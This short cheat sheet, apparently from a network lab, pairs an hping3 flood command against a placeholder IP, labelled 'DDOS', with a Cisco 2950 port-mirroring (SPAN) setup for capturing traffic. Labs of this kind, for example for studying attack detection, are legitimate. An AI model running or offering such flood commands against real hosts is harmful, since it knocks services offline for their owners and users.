### DDOS:
sudo hping3 xxx.xxx.x.xxx --flood -d 50000

### Collect Data:
## SPAN of Cisco 2950:
C2950#configure terminal
C2950(config)#
C2950(config)#monitor session 1 source interface fastethernet 0/2

!--- This configures interface Fast Ethernet 0/2 as source port.

C2950(config)#monitor session 1 destination interface fastethernet 0/3

!--- This configures interface Fast Ethernet 0/3 as destination port.

C2950(config)# 

C2950#show monitor session 1
Session 1---------
Source Ports:
    RX Only:       None
        TX Only:       None
        Both:          Fa0/2
Destination Ports: Fa0/3
